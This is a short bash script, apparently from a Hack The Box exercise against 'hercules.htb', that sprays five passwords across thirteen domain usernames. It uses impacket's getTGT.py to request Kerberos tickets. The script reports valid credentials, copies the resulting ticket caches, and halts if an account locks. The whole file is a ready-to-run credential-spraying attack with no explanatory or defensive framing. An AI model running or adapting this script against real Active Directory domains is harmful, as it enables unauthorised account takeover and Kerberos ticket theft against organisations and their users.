#!/bin/bash
DC=10.129.242.196
GT=/usr/share/doc/python3-impacket/examples/getTGT.py
USERS="auditor will.s mark.s ashley.b heather.s stephen.m patrick.s jennifer.a zeke.s tish.c admin administrator johnathan.j"

PWS=(
  'change*th1s_p@ssw()rd!!'
  'changeth1s_p@ssw()rd!!'
  'Change*th1s_p@ssw()rd!!'
  'th1s_p@ssw()rd!!'
  'change*th1s_p@ssw0rd!!'
)

for pw in "${PWS[@]}"; do
  echo "=== '$pw' ==="
  for u in $USERS; do
    out=$(python3 "$GT" "hercules.htb/$u:$pw" -dc-ip $DC 2>&1)
    if echo "$out" | grep -qiE 'Saving ticket|Got TGT'; then
      echo "  [VALID] $u : $pw"
      [ -f "$u.ccache" ] && cp "$u.ccache" "/home/kali/hercules/$u.ccache"
    elif echo "$out" | grep -qiE 'locked'; then
      echo "  [!] $u LOCKED - aborting"; exit 1
    fi
    sleep 0.4
  done
done
echo "=== done ==="
